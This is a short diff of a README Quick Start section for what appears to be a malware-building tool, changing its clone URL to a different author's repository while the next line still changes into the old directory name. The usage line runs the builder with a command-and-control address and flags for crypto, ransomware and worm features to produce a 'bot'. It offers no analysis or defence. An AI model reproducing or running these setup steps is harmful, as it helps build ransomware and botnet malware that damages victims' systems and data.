@@ -15,6 +15,6 @@ creator:teekay92
 @telegram https://t.me/teekayempire1
 ## Quick Start
 ```bash
-git clone https://github.com/anon-blackhat/nightmareforge.git
+git clone https://github.com/teekay92/NONOAPT_GEN.git
 cd nightmareforge
 python3 nightmareforge.py --c2 YOUR_IP:PORT --output bot --crypto --ransom --worm -v
